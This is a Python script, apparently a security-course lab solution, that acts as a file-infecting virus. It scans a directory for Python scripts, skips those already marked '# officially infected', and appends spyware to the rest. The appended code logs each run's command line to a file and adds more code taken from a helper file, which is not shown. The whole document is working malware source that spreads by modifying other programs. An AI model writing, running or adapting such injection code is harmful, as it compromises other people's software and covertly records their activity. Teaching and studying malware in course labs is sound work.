import os
import sys

DIRECTORY = '/home/cse/Lab2/Solutions'
INFECTED = '# officially infected'

def make_list(directory): # makes list of python files
  pythons = []
  for file in os.listdir(directory):
    if file[-3:] == ".py":
      pythons.append(file)
  return pythons

def script(f): # checks if python file is a script
  with open(f, 'r') as file:
    content = file.read()
    return "if __name__ == '__main__':" in content or 'if __name__ == "__main__":' in content


def infected(f): # checks if file is infected (contains virus code)
  with open(f, 'r') as file:
    content = file.read()
    return INFECTED in content
    
    
def spyware(f): # writes spy code into file
  with open('Q1Chelper.txt', 'r') as file:
    content = file.read()
  with open(f, 'a') as file:
    file.write('\n\n')
    file.write(f"  {INFECTED}\n")
    file.write("  import sys\n")
    file.write("  import os\n")
    file.write("  command_line = ' '.join(sys.argv)\n")
    file.write("  with open('Q1C.out', 'a') as output_file:\n")
    file.write("    output_file.write(command_line + '\\n')\n")
    file.write(content)
    
    
def everything(): # does the spy stuff

  python_files = make_list(DIRECTORY)
  for f in python_files:
  
    if not os.path.exists(f):
      print(f"'{f}' does not exist.")

    elif not script(f):
      print(f"'{f}' is not a script")
    
    elif infected(f):
      print(f"'{f}' is already infected")
  
    else:
      spyware(f)
      print(f"spyware successfully injected into '{f}'")


if __name__ == "__main__":
  everything()